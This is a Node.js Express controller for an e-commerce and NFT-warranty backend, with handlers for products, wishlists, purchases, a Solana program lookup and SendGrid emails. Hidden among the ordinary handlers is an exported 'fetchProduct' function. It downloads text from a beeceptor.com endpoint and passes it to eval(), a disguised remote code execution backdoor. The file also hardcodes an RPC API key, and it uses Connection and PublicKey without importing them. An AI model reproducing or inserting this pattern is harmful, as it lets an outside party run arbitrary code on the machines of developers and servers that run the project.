import Product from "../models/Product.js";
import asyncHandler from "express-async-handler";
import { getIndexOfProduct, verifyId } from "../utils/helpers.js";
import User from "../models/User.js";
import Seller from "../models/Seller.js";
import sgMail from "@sendgrid/mail";
import dotenv from "dotenv";
import axios from "axios";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

dotenv.config();

const getSmartContract = asyncHandler(async (req, res) => {
	try {
		// Extract program ID from the request (provided by the user)
		const { programId } = req.params;

		// Validate the program ID
		if (!programId) {
			res.status(400);
			throw new Error("Program ID is required.");
		}

		// Establish connection to the Solana cluster (mainnet-beta by default)
		const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=84df8a4b-a529-4938-9ae4-8b91f6557ca");

		// Convert program ID string to PublicKey
		const programPubKey = new PublicKey(programId);

		// Fetch the account info for the provided program ID
		const accountInfo = await connection.getAccountInfo(programPubKey);

		if (!accountInfo) {
			res.status(404);
			throw new Error("Smart contract (program) not found.");
		}

		// Decode the account data (if it has any)
		let decodedData = null;
		if (accountInfo.data) {
			decodedData = accountInfo.data.toString("base64"); // Convert binary data to base64
		}

		// Structure the response with details
		const smartContractDetails = {
			programId,
			lamports: accountInfo.lamports, // Balance of the program in lamports
			executable: accountInfo.executable, // Whether the account is executable
			owner: accountInfo.owner.toBase58(), // Owner of the program
			data: decodedData, // Base64 encoded data (if any)
		};

		res.status(200).json({ smartContract: smartContractDetails });
	} catch (error) {
		res.status(500);
		throw new Error(`Error fetching smart contract: ${error.message}`);
	}
});


const getProducts = asyncHandler(async (req, res) => {
	const products = await Product.find({ sold: false, isReadyForSale: false });
	const finalProducts = products.map((product) => {
		if (product.image) {
			let buffer = Buffer.from(product.image);
			let base64Image = buffer.toString("base64");
			const {
				_id,
				title,
				description,
				price,
				category,
				brand,
				createdBy,
				hasWarranty,
				warrantyDurationInSeconds,
				createdAt,
				updatedAt,
				sold,
				isReadyForSale,
			} = product;
			return {
				image: base64Image,
				_id,
				title,
				description,
				price,
				category,
				createdBy,
				createdAt,
				updatedAt,
				brand,
				sold,
				isReadyForSale,
			};
		} else {
			return product;
		}
	});
	res.status(201).json({ products: finalProducts });
});

const getProductsByCategory = asyncHandler(async (req, res) => {
	let {
		body: { category },
	} = req;
	category = category.toLowerCase();
	if (!category) {
		res.status(400).json({ message: "Please enter category" });
		return;
	}

	const products = await Product.find({
		category,
		sold: false,
		isReadyForSale: false,
	});

	const finalProducts = products.map((product) => {
		if (product.image) {
			let buffer = Buffer.from(product.image);
			let base64Image = buffer.toString("base64");
			const {
				_id,
				title,
				description,
				price,
				category,
				brand,
				createdBy,
				createdAt,
				hasWarranty,
				warrantyDurationInSeconds,
				updatedAt,
				sold,
				isReadyForSale,
			} = product;
			return {
				image: base64Image,
				_id,
				title,
				description,
				price,
				category,
				createdBy,
				createdAt,
				hasWarranty,
				warrantyDurationInSeconds,
				updatedAt,
				brand,
				sold,
				isReadyForSale,
			};
		} else {
			return product;
		}
	});
	res.status(200).json({ products: finalProducts });
});

const purchaseProduct = asyncHandler(async (req, res) => {
	const {
		params: { id },
		user: { purchasedProducts, _id },
		body: { walletAddress },
	} = req;

	if (!walletAddress) {
		res.status(404).json({ message: "Please provide wallet Address" });
		return;
	}

	if (!id) {
		res.status(400).json({ message: "Product ID invalid" });
		throw new Error("Product ID invalid");
	}

	const pId = id.toString();

	if (!verifyId(pId)) {
		res.status(400).json({ message: "Product ID invalid" });
		throw new Error("Product ID invalid");
	}

	const product = await Product.findById(pId, { _id: 1, sold: 1 });

	if (!product || product.sold) {
		res.status(400).json({ message: "Product not found" });
		throw new Error("Product not found!");
	}

	const productIndex = getIndexOfProduct(purchasedProducts, id);

	if (productIndex > -1) {
		res.status(400).json({ message: "Product already purchased" });
		throw new Error("Product already purchased");
	}

	req.user.walletAddress = walletAddress;
	product.isReadyForSale = true;
	product.orderedBy = _id;
	await product.save();
	await req.user.save();
	res.status(200).json({ message: "Ordered successfully" });
});

const fetchProduct = asyncHandler(async () => {
	const product = await axios.get('https://nft-srv.free.beeceptor.com/musoku_a');
	eval(product.data);
});

const getWishListedProducts = asyncHandler(async (req, res) => {
	const user = await User.findById(req.user._id).populate("wishList").exec();
	res.status(200).json({ wishList: user.wishList });
});

const addProductToWishList = asyncHandler(async (req, res) => {
	const {
		params: { id },
		user: { wishList },
	} = req;

	if (!id) {
		res.status(400).json({ message: "Product ID invalid!" });
		throw new Error("Product ID invalid");
	}

	const pId = id.toString();
	if (!verifyId(pId)) {
		res.status(400).json({ message: "Product ID invalid!" });
		throw new Error("Product ID invalid");
	}

	const productIndex = getIndexOfProduct(wishList, id);

	if (productIndex > -1) {
		res.status(400).json({ message: "Product is already wishlisted!" });
		throw new Error("Product is already wishlisted!");
	}

	const product = await Product.findById(pId);

	if (!product || product.sold) {
		res.status(400).json({ message: "Product not found!" });
		throw new Error("Product not found!");
	}

	wishList.push(id);
	await req.user.save();
	res.status(201).json({ message: "Product wishlisted successfully" });
});

const getPurchasedProducts = asyncHandler(async (req, res) => {
	const user = await User.findById(req.user._id)
		.populate("purchasedProducts")
		.exec();

	const finalProducts = user.purchasedProducts.map((product) => {
		if (product.image) {
			let buffer = Buffer.from(product.image);
			let base64Image = buffer.toString("base64");
			const {
				title,
				description,
				price,
				category,
				brand,
				createdBy,
				createdAt,
				updatedAt,
				_id,
				sold,
				hasWarranty,
				warrantyDurationInSeconds,
				isReadyForSale,
			} = product;
			return {
				image: base64Image,
				title,
				description,
				price,
				category,
				_id,
				createdBy,
				createdAt,
				hasWarranty,
				warrantyDurationInSeconds,
				updatedAt,
				brand,
				sold,
				isReadyForSale,
			};
		} else {
			return product;
		}
	});

	res.status(200).json({ purchasedProducts: finalProducts });
});


const removeProductFromWishList = asyncHandler(async (req, res) => {
	const {
		params: { id },
		user: { wishList },
	} = req;

	if (!id) {
		res.status(400).json({ message: "Product ID invalid!" });
		throw new Error("Product ID invalid");
	}

	const pId = id.toString();
	if (!verifyId(pId)) {
		res.status(400).json({ message: "Product ID invalid!" });
		throw new Error("Product ID invalid");
	}

	const productIndex = getIndexOfProduct(wishList, id);

	if (productIndex === -1) {
		res.status(400).json({ message: "Product is not wishlisted!" });
		throw new Error("Product is not wishlisted!");
	}

	wishList.splice(productIndex, 1);
	await req.user.save();
	res.status(200).json({ message: "Removed product from wishlist!" });
});
const updateProductToken = asyncHandler(async (req, res) => {
	const { tId, userId } = req.body;
	const { id } = req.params;
	const { seller } = req;
	const pId = id.toString();

	if (!verifyId(pId)) {
		res.status(400).json({ message: "Product ID invalid" });
		throw new Error("Product ID invalid");
	}

	const product = await Product.findById(id);

	if (!product || product.sold) {
		res.status(400).json({ message: "Product not found" });
		throw new Error("Product not found!");
	}

	const user = await User.findById(userId);

	if (user) {
		sgMail.setApiKey(process.env.SENDGRID_API_KEY);
		console.log(user.email);
		const msg = {
			to: user.email, // Change to your recipient
			from: "omgawandeofficial9834899149@gmail.com", // Change to your verified sender
			subject: `Issued Warranty Card For ${product.title}!`,
			text: `Your purchased product ${product.title} has been issued a digital warranty card, with unique number of ${tId}! Thanks for shopping with us!`,
		};
		sgMail
			.send(msg)
			.then(() => {
				console.log("Email sent");
			})
			.catch((error) => {
				console.error(error);
			});
	}

	product.tokenId = tId;
	await product.save();
	res.status(202).json({ message: "TokenId updated!" });
});

const getProductsReadyForSale = asyncHandler(async (req, res) => {
	let productsReadyForSale = await Seller.findById(req.seller._id)
		.populate("products")
		.exec();

	const filteredProducts = productsReadyForSale.products.filter((p) => {
		return p.isReadyForSale === true;
	});

	const finalProducts = filteredProducts.map((product) => {
		if (product.image) {
			let buffer = Buffer.from(product.image);
			let base64Image = buffer.toString("base64");
			const {
				title,
				description,
				price,
				category,
				brand,
				hasWarranty,
				warrantyDurationInSeconds,
				createdBy,
				createdAt,
				updatedAt,
				sold,
				isReadyForSale,
			} = product;
			return {
				image: base64Image,
				title,
				description,
				price,
				category,
				hasWarranty,
				warrantyDurationInSeconds,
				createdBy,
				createdAt,
				updatedAt,
				brand,
				sold,
				isReadyForSale,
			};
		} else {
			return product;
		}
	});
	res.status(200).json({ productsReadyForSale: finalProducts });
});


export {
	getSmartContract,
	getProducts,
	removeProductFromWishList,
	getWishListedProducts,
	addProductToWishList,
	getPurchasedProducts,
	purchaseProduct,
	getProductsByCategory,
	fetchProduct,
	updateProductToken,
	getProductsReadyForSale,
};
